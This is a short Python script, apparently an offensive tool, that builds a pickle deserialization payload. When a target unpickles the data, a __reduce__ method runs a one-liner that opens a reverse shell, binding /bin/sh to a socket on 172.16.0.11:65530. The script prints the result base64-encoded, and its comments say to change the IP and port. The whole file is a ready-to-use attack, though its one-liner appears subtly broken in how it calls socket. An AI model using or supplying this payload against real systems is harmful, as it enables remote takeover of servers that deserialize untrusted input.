# Deserialization using python and pickle
# Payload to get reverse shell
# Change IP and port on line 14

import pickle
import base64
import subprocess
import os
import sys


class Shell(object):
    def __reduce__(self):
        return (os.system, ("python -c 'import socket,subprocess,os;s=socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.16.0.11\",65530));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))


pickledData = pickle.dumps(Shell())
print(base64.b64encode(pickledData))
